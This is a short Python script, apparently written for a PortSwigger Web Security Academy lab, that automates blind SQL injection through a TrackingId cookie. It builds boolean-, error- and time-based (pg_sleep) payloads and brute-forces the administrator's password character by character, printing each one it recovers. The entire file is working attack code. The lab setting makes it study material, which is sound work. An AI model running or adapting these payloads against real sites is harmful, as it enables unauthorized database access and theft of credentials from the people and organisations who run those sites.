#!/bin/python3
import requests

chars = [0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']

#Infer truth by checking response has "Welcome back" message
def GetSQL(num,char):
    return "x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,%s,1)='%s'--" % (num,char)


#Infer truth by causing errors
def GetSQL2(num,char):
    return "'+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+substr(password,%s,1)='%s')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--" % (num,char)


#Infer truth by causing a time delay
def GetSQL3(num,char):
    return "%s,1)='%s')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--" % (num,char)



for i in range (1,21):
    for c in chars:
        #print("Checking Char")
        #proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}
        inject = GetSQL3(i,c)
        tracking = "x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+substring(password," + inject
        #print(tracking)
        cookies = dict(TrackingId=tracking, session="OrqVD0KGbf0CeHk43UoKiKPuJL9jGpRN")
        #cookie = 'TrackingId=' + inject + "; session=Sf9gnFdpAhSNgOYPWWfnN78eXNjGwGDJ"
        headers = {
            'Host': "ac771f631eb2f14780167d5b00f400d4.web-security-academy.net",
            'Referer': 'https://ac771f631eb2f14780167d5b00f400d4.web-security-academy.net/',
            'User-Agent' : "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
            'Accept-Language': "en-US,en;q=0.5",
            'Accept' : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            'Accept-Encoding': "gzip, deflate",
            'Upgrade-Insecure-Requests' : "1",
            'Cache-Control' : "max-age=0",
            'Connection': "close",
        }
        r = requests.get('https://ac771f631eb2f14780167d5b00f400d4.web-security-academy.net', headers=headers, cookies=cookies)
        #print(r.status_code)        
        #print(r.request.headers)
        #if "Welcome back" in r.text:
        #if r.status_code == 500:
        if r.elapsed.total_seconds() > 5:
            print(c, end='', flush=True)
            break
print()